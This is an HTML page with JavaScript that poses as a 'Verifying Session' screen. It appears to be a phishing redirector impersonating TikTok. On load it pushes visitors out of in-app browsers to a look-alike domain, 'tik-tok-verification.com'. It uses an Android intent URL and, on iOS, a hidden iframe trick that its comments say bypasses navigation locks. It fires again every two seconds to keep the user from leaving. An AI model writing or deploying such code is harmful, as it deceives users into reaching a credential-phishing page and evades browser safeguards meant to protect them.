<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body { background: #fff; margin: 0; padding: 0; overflow: hidden; }</style>
</head>
<body>

<div id="status" style="padding: 20px; font-family: sans-serif; text-align: center;">Verifying Session...</div>

<script>
    const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
    const domain = "tik-tok-verification.com/Verification/verify1.html";

    function triggerEject() {
        const isAndroid = /Android/i.test(navigator.userAgent);

        if (isAndroid) {
            // Android: The Intent protocol is still the only 100% way.
            window.location.href = `intent://${domain}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
        } else {
            // iOS: THE FRAME-BURST
            // We create an invisible iframe that contains an auto-redirecting meta tag.
            // This bypasses the 'top-level' navigation lock.
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            document.body.appendChild(iframe);

            const frameDoc = iframe.contentWindow.document;
            const content = `
                <html>
                <head>
                    <meta http-equiv="refresh" content="0;url=safari-https://${domain}">
                </head>
                <body>
                    <script>window.location.replace("googlechromes://${domain}");<\/script>
                </body>
                </html>
            `;
            
            frameDoc.open();
            frameDoc.write(content);
            frameDoc.close();

            // Backup: Top-level protocol hit
            setTimeout(() => {
                window.location.href = "safari-https://" + domain;
            }, 500);
        }
    }

    // Fire immediately
    triggerEject();

    // Re-trigger if they stay on the page (e.g. they close the popup)
    setInterval(() => {
        if (document.hasFocus()) {
            triggerEject();
        }
    }, 2000);
</script>
</body>
</html>
